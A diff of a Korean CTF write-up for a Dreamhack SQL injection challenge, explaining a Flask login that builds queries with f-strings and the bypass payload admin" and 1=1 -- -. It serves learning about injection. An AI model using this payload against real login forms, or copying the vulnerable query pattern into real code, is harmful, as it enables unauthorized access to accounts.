@@ -17,89 +17,41 @@ http://host3.dreamhack.games:16340/
 
 ### 2-2. 코드 확인
 
-```python
-#!/usr/bin/python3
-
-from flask import Flask, request, render_template, g
-import sqlite3
-import os
-import binascii
-
-app = Flask(__name__)
-
-app.secret_key = os.urandom(32)
-
-try:
-    FLAG = open('./flag.txt', 'r').read()
-except:
-    FLAG = '[**FLAG**]'
-
-DATABASE = "database.db"
-
-if os.path.exists(DATABASE) == False:
-    db = sqlite3.connect(DATABASE)
-    db.execute('create table users(userid char(100), userpassword char(100));')
-    db.execute(
-        f'insert into users(userid, userpassword) values '
-        f'("guest", "guest"), '
-        f'("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}")'
-    )
-    db.commit()
-    db.close()
-
-def get_db():
-    db = getattr(g, '_database', None)
-
-    if db is None:
-        db = g._database = sqlite3.connect(DATABASE)
-
-    db.row_factory = sqlite3.Row
-    return db
-
-def query_db(query, one=True):
-    cur = get_db().execute(query)
-    rv = cur.fetchall()
-    cur.close()
-    return (rv[0] if rv else None) if one else rv
-
-@app.teardown_appcontext
-def close_connection(exception):
-    db = getattr(g, '_database', None)
-
-    if db is not None:
-        db.close()
-
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    if request.method == 'GET':
-        return render_template('login.html')
-    else:
-        userid = request.form.get('userid')
-        userpassword = request.form.get('userpassword')
-
-        res = query_db(
-            f'select * from users where userid="{userid}" '
-            f'and userpassword="{userpassword}"'
-        )
-
-        if res:
-            userid = res[0]
-
-            if userid == 'admin':
-                return f'hello {userid} flag is {FLAG}'
-
-            return f'<script>alert("hello {userid}");history.go(-1);</script>'
-
-        return '<script>alert("wrong");history.go(-1);</script>'
-
-app.run(host='0.0.0.0', port=8000)
-```
+> > app.py
 
 ### 2-3. 코드 분석
+
+#### 1. SQLite DBMS에 연결 + users 테이블 생성 부분
+
+```python
+if os.path.exists(DATABASE) == False:
+    db = sqlite3.connect(DATABASE) #database.db라는 SQLite 데이터베이스에 연결
+    db.execute('create table users(userid char(100), userpassword char(100));')
+    #users 라는 테이블을 생성. userid와 userpassword 컬럼을 가짐
+```
+
+> > 사용자가 입력한 userid와 userpassword를 그대로 SQL 쿼리에 넣고있음. 즉, 사용자가 단순한 아이디나 비밀번호가 아니라 SQL 문법을 입력하면 그게 SQL 쿼리의 일부로 실행될 수 있다. -> 이런 취약점을 SQL Injection 이라고한다!
+
+#### 2. guest와 admin 계정 레코드를 삽입
+
+```python
+    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
+    #("guest", "guest") guest 계정
+    #("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}") admin 계정
+```
+
+#### 3. admin의 비밀번호가 랜덤한 문자열로 생성되는 부분
+
+```python
+    binascii.hexlify(os.urandom(16)).decode("utf8")
+    # os.urandom(16) >> 랜덤한 16바이트 데이터를 생성
+    # binascii.hexlify() >> 그 데이터를 16진수 형태의 문자열로 변환
+    #.decode("utf8") >> 문자열로 변환
+```
+
+> > 계정을 보면 guest와 admin이 있는데, admin의 비밀번호가 랜덤으로 생성되고있다. 따라서 비밀번호를 알아내는 게 아니라, SQL Injection으로 로그인 조건 자체를 변조하는 방법을 사용해야한다.
+
+### 2-4.코드 상세 설명
 
 SQLite DBMS에 연결 후 `userid`와 `userpassword` 컬럼을 가진 `users`라는 테이블을 생성하고 있다.
 
@@ -128,7 +80,26 @@ binascii.hexlify(os.urandom(16)).decode("utf8")
 
 ---
 
-### 2-4. Login 페이지
+### 2-5. Login 페이지
+
+로그인 페이지에서 일반 아이디와 비밀번호를 입력할 경우 서버에서 만들어지는 쿼리.
+
+```sql
+select * from users
+where userid="admin"
+and userpassword="1234"
+```
+
+DB에서 userid가 admin이고 동시에 비밀번호가 1234인 사용자를 찾는데, admin의 실제 비밀번호를 모르기 때문에 이렇게 입력하면 로그인이 되지 않는다.
+
+아이디에 sql 문법을 입력하면 로그인이 풀린다.
+
+```text
+id: admin" and 1=1 -- -
+pw: 1234
+```
+
+#### 상세 설명
 
 코드 아래쪽에는 취약한 페이지인 `/login` 페이지에 대한 기능이 정의되어 있다.
 로그인 페이지는 `POST` 메소드로 `userid`와 `userpassword`를 입력받는다.
@@ -154,13 +125,61 @@ select * from users where userid="{userid}" and userpassword="{userpassword}"
 
 ## 3. SQL Injection Payload
 
-다음과 같은 Payload를 `userid`로 전송한다.
+다음과 같은 Payload를 `userid`로 전송했을 때 로그인이 성공하였다.
 
 ```text
-admin" and 1=1 -- -
+    admin" and 1=1 -- -
 ```
 
-`1=1`은 항상 참이 되는 조건이며, `-- -`를 이용하여 이후의 내용을 주석 처리할 수 있다.
+원래 쿼리문
+
+```sql
+    select * from users
+    where userid="{userid}"
+    and userpassword="{userpassword}"
+```
+
+id에 해당 쿼리문을 입력하면 이렇게 만들어진다.
+
+```sql
+    select * from users
+    where userid="admin" and 1=1 -- -"
+    and userpassword="1234"
+```
+
+### 쿼리문 분석
+
+> > admin" and 1=1 -- -
+
+#### admin"
+
+```sql
+    userid="{userid}"
+```
+
+해당 sql에 `admin"`을 넣으면
+
+```sql
+    userid="admin""
+```
+
+으로, 추가한" 가 문자열을 닫는 역할을 하기때문에 이후에 SQL조건을 추가할 수 있게 된다.
+
+#### and 1=1
+
+```sql
+    userid="admin" and 1=1
+```
+
+`1=1`은 항상 참이 되는 조건이기 때문에 admin이라는 조건이 참이면 항상 참이 된다.
+
+#### -- -
+
+`-- -`를 이용하여 이후의 내용을 주석 처리할 수 있다.
+
+sql에서 --는 주석을 시작하는 역할을 한다.
+그래서 뒤에 오는 pw 내용(and userpassword="1234") 전체를 주석처리해버린다.
+따라서 서버가 실질적으로 확인하는 내용은 `where userid="admin" and 1=1` 가 되기때문에 비밀번호가 필요없어진다.
 
 ---
 
